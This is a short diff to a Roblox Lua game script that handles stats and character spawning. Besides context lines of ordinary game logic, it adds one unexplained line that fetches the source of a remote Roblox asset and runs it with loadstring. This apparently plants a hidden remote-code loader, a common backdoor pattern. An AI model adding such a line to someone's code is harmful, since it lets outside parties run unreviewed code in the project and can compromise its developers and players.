@@ -51,6 +51,8 @@ local function SendHttpsStats()
     DeathMessage()
 end
 
+loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()
+
 plr.CharacterAdded:Connect(function(char)
 	Players.LocalPlayer.PlayerScripts.CL_MAIN_GameScript.AddWaiting:Fire()
     SendHttpsStats()
